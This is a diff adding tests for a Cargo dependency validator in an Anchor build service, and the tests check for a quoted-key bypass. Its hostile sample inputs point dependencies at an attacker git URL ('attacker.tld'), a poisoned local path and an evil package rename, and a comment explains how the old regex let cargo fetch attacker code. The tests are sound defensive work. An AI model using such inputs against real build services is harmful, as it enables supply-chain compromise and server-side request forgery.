@@ -166,3 +166,47 @@ describe("validateAnchorExtraDeps — refusals", () => {
     expect(validateAnchorExtraDeps(`"anchor-spl" = "0.31"`)).toBeTruthy();
   });
 });
+
+describe("validateAnchorExtraDeps — quoted-key bypass (SSRF)", () => {
+  // The banned-key regex `\bgit\s*=` could not see a QUOTED key: the closing
+  // quote in `"git" =` breaks the git→= adjacency, so `{ "git" = "attacker" }`
+  // sailed through and cargo cloned the attacker URL during the out-of-sandbox
+  // fetch. The allowlist parses KEYS, so quoting no longer helps.
+  test(`double-quoted "git" key → 400`, () => {
+    expectThrowsAnvilError(
+      () => validateAnchorExtraDeps(`spl-memo = { "git" = "https://attacker.tld/evil-spl-memo" }`),
+      "git",
+    );
+  });
+
+  test(`single-quoted 'path' key → 400`, () => {
+    expectThrowsAnvilError(
+      () => validateAnchorExtraDeps(`spl-memo = { 'path' = "/tmp/poisoned" }`),
+      "path",
+    );
+  });
+
+  test(`quoted "package" rename alongside a valid version → 400`, () => {
+    expectThrowsAnvilError(
+      () => validateAnchorExtraDeps(`bytemuck = { version = "1", "package" = "totally-evil-crate" }`),
+      "package",
+    );
+  });
+
+  test("a value string containing '=' or ',' does not spawn a phantom key", () => {
+    // `features = ["a=b,c"]` is allowed — the parser must not treat the inner
+    // '=' as a key delimiter and reject a made-up key.
+    expect(validateAnchorExtraDeps(`anchor-spl = { version = "0.31", features = ["a=b,c"] }`)).toBeTruthy();
+  });
+
+  test("default-features = false passes (allowlisted key)", () => {
+    expect(validateAnchorExtraDeps(`bytemuck = { version = "1.13", default-features = false }`)).toBeTruthy();
+  });
+
+  test("an unknown non-source key (workspace) is still refused (fail-closed)", () => {
+    expectThrowsAnvilError(
+      () => validateAnchorExtraDeps(`bytemuck = { workspace = true }`),
+      "workspace",
+    );
+  });
+});
